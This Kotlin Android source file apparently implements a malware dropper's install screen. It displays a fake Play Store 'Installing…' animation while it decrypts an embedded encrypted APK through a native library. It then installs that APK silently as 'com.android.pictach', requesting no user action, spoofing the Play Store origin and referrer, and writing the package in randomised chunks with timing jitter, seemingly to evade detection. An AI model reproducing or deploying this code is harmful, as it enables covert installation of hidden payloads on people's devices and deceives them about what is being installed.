package com.cristal.bristral.tristal.mistral

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.drawable.AnimationDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.util.concurrent.ThreadLocalRandom

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())
    private var nativeLibLoaded = false

    // Status text cycling — matches Play Store behaviour
    private val statusMessages = listOf("Installing\u2026", "Please wait\u2026", "Finishing up\u2026", "Please wait\u2026")
    private var statusIndex = 0
    private lateinit var statusCycleRunnable: Runnable

    companion object {
        private const val TAG             = "InstallActivity"
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private const val MARKET_URI     = "market://details?id=com.android.pictach"
        private const val REFERRER_URI   = "android-app://com.android.vending"
        private const val WRITE_NAME     = "update.pkg"
        private const val CHUNK_MIN      = 131072
        private const val CHUNK_MAX      = 524288
        private const val DELAY_MIN      = 400L
        private const val DELAY_MAX      = 800L
        private const val ENCRYPTED_ASSET = "companion.enc"
        private const val TEMP_APK_NAME  = "companion_install.apk"
    }

    private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Hide status bar for full white immersive screen
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        )

        setContentView(R.layout.activity_install)

        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)

        // Start bouncing dots animation
        val dotsView = findViewById<ImageView>(R.id.iv_dots_animation)
        val anim = dotsView.drawable as? AnimationDrawable
        anim?.start()

        // Cycle status text every 2.2 seconds like Play Store
        statusCycleRunnable = object : Runnable {
            override fun run() {
                statusIndex = (statusIndex + 1) % statusMessages.size
                tvStatus?.text = statusMessages[statusIndex]
                handler.postDelayed(this, 2200)
            }
        }
        handler.postDelayed(statusCycleRunnable, 2200)

        nativeLibLoaded = try {
            System.loadLibrary("companionguard")
            true
        } catch (e: UnsatisfiedLinkError) {
            Log.e(TAG, "libcompanionguard.so failed: ${e.message}")
            false
        }

        Thread { runPipeline() }.start()
    }

    private fun runPipeline() {
        try {
            val apkBytes = loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) {
                showNormal()
                return
            }
            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
        } catch (e: Exception) {
            showNormal()
        }
    }

    private fun loadAssets(): ByteArray? {
        if (nativeLibLoaded) {
            val tempApk = File(filesDir, TEMP_APK_NAME)
            try {
                val encBlob = assets.open(ENCRYPTED_ASSET).use { it.readBytes() }
                val ok = decryptCompanion(encBlob, tempApk.absolutePath)
                if (ok && tempApk.exists() && tempApk.length() > 0) {
                    val magic = ByteArray(2)
                    FileInputStream(tempApk).use { it.read(magic) }
                    if (magic[0] == 'P'.code.toByte() && magic[1] == 'K'.code.toByte()) {
                        val bytes = tempApk.readBytes()
                        tempApk.delete()
                        return bytes
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Encrypted load failed: ${e.message}")
            } finally {
                if (tempApk.exists()) tempApk.delete()
            }
        }
        return try {
            assets.open("companion.apk").use { it.readBytes() }
        } catch (e: Exception) {
            Log.e(TAG, "Fallback load failed: ${e.message}")
            null
        }
    }

    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            params.setAppPackageName("com.android.pictach")
            params.setSize(apkBytes.size.toLong())
            params.setInstallLocation(1)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                params.setDontKillApp(true)

            params.setInstallReason(PackageManager.INSTALL_REASON_USER)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                params.setRequestUpdateOwnership(true)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    params.setOriginatingUri(Uri.parse(MARKET_URI))
                    params.setReferrerUri(Uri.parse(REFERRER_URI))
                } catch (e: Exception) { }
            }

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)

            try {
                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    var offset = 0
                    while (offset < apkBytes.size) {
                        val chunkSize = ThreadLocalRandom.current().nextInt(CHUNK_MIN, CHUNK_MAX)
                        val end = minOf(offset + chunkSize, apkBytes.size)
                        out.write(apkBytes, offset, end - offset)
                        session.fsync(out)
                        offset = end
                    }
                }

                val jitter = ThreadLocalRandom.current().nextLong(DELAY_MIN, DELAY_MAX)
                Thread.sleep(jitter)

                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
                }

                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else
                    PendingIntent.FLAG_UPDATE_CURRENT

                val pendingIntent = PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags)
                session.commit(pendingIntent.intentSender)
                session.close()

            } catch (e: IOException) {
                session.abandon()
                if (attempt < MAX_RETRIES)
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                else
                    showNormal()
            }
        } catch (e: Exception) {
            if (attempt < MAX_RETRIES)
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            else
                showNormal()
        }
    }

    private fun showNormal() {
        runOnUiThread {
            tvStatus?.text = getString(R.string.please_keep_connected)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
}
